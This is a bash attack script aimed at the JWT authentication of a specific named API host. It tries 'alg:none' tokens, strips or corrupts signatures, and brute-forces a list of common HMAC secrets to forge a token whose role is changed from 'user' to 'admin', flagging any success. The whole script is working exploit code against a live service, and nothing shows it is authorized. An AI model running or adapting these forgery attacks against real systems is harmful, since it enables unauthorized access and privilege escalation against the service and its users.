#!/usr/bin/env bash
A="https://api.breezy.philippeluu.fr"
OUT=/tmp/riveta
TA=$(jq -r '.data.token' "$OUT/regA.json" 2>/dev/null)
[ -z "$TA" ] && TA=$(jq -r '.data.token' <(cat "$OUT/regA.json"))

b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }

echo "===== baseline: A token on /users/me ====="
curl -sS -m 10 -o /dev/null -w "status=%{http_code}\n" "$A/users/me" -H "Authorization: Bearer $TA"

UID=$(echo "$TA" | cut -d. -f2 | tr '_-' '/+'); UID="${UID}$(printf '=%.0s' $(seq $(( (4 - ${#UID} % 4) % 4 )) ) )"
PAY=$(echo "$TA" | cut -d. -f2)
echo "payload(A): $(echo $PAY | tr '_-' '/+' | base64 -d 2>/dev/null)"
echo

echo "===== attack 1: alg=none (sub claim kept), empty signature ====="
HDR_NONE=$(printf '{"alg":"none","typ":"JWT"}' | b64url)
BODY=$(echo "$PAY")
for sig in "" "."; do
  TOK="$HDR_NONE.$BODY."
  echo -n "alg:none -> "; curl -sS -m 10 -o /dev/null -w "%{http_code}\n" "$A/users/me" -H "Authorization: Bearer $TOK"
done

echo "===== attack 2: signature stripped / swapped ====="
echo -n "no-sig -> "; curl -sS -m 10 -o /dev/null -w "%{http_code}\n" "$A/users/me" -H "Authorization: Bearer $(echo $TA | cut -d. -f1).$BODY."
echo -n "garbage-sig -> "; curl -sS -m 10 -o /dev/null -w "%{http_code}\n" "$A/users/me" -H "Authorization: Bearer $(echo $TA | cut -d. -f1).$BODY.AAAA"

echo "===== attack 3: HS256 weak-secret forge (try common secrets) ====="
HDR=$(printf '{"alg":"HS256","typ":"JWT"}' | b64url)
# forge an admin token for user A's id by re-signing with guessed secret
ADMINPAY=$(echo "$PAY" | tr '_-' '/+' | base64 -d 2>/dev/null | sed 's/"role":"user"/"role":"admin"/' | b64url)
for secret in secret secret123 changeme jwt_secret jwtsecret supersecret password 123456 breezy breezy_secret your-256-bit-secret my_secret access_secret JWT_SECRET test dev; do
  SIG=$(printf '%s' "$HDR.$ADMINPAY" | openssl dgst -sha256 -hmac "$secret" -binary | b64url)
  TOK="$HDR.$ADMINPAY.$SIG"
  code=$(curl -sS -m 10 -o /dev/null -w "%{http_code}" "$A/users/me" -H "Authorization: Bearer $TOK")
  if [ "$code" = "200" ]; then echo "!!! WEAK SECRET FOUND: '$secret' -> 200 (admin forge works)"; else echo "secret='$secret' -> $code"; fi
done
